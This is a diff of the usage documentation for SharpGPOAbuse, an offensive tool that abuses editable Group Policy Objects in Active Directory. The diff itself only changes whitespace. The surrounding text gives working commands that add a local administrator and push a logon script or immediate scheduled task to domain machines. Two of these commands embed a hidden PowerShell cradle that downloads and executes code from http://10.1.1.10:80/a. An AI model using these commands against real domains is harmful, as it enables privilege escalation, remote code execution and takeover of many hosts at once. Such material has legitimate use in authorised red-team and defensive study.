@@ -59,9 +59,9 @@ Options required to add a new local admin:
 Example:
         SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
 ```
-
 ### Configuring a User or Computer Logon Script  
 ```
+
 Options required to add a new user or computer startup script:
 --ScriptName
         Set the name of the new startup script.
@@ -72,10 +72,11 @@ Options required to add a new user or computer startup script:
 
 Example: 
         SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+        
 ```
-
 ### Configuring a Computer or User Immediate Task  
 ```
+
 Options required to add a new computer or user immediate task:
 --TaskName
         Set the name of the new computer task.
@@ -90,8 +91,8 @@ Options required to add a new computer or user immediate task:
 
 Example: 
         SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+        
 ```
-
 ## Additional Options 
 | Option               | Description                               |
 | ---------------------|-------------------------------------------|
